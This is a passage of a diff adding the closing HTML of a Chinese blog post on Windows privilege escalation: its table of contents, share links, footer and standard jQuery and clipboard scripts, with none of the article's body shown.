+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%87%AD%E6%8D%AE"><span class="toc-number">2.</span> <span class="toc-text">敏感文件泄露凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">域环境下的信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%BC%8F%E6%B4%9EAlwaysInstallElevated%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">通过注册表漏洞AlwaysInstallElevated进行提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%BB%E6%9C%BA%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">利用主机服务进行提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%B8%8D%E6%AD%A3%E7%A1%AE%E7%9A%84%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">通过不正确的文件权限进行提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo1"><span class="toc-number">6.1.</span> <span class="toc-text">Demo1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo2"><span class="toc-number">6.2.</span> <span class="toc-text">Demo2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo3"><span class="toc-number">6.3.</span> <span class="toc-text">Demo3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UAC"><span class="toc-number">7.</span> <span class="toc-text">UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83"><span class="toc-number">7.1.</span> <span class="toc-text">绕过UAC提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tips"><span class="toc-number">8.</span> <span class="toc-text">Tips</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/08/WindowsPrivilegeEscalation/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&text=Windows Privilege Escalation"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&title=Windows Privilege Escalation"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&is_video=false&description=Windows Privilege Escalation"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Windows Privilege Escalation&body=Check out this article: http://example.com/2024/04/08/WindowsPrivilegeEscalation/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&title=Windows Privilege Escalation"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&title=Windows Privilege Escalation"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&title=Windows Privilege Escalation"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&title=Windows Privilege Escalation"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&name=Windows Privilege Escalation&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/08/WindowsPrivilegeEscalation/&t=Windows Privilege Escalation"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2010-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
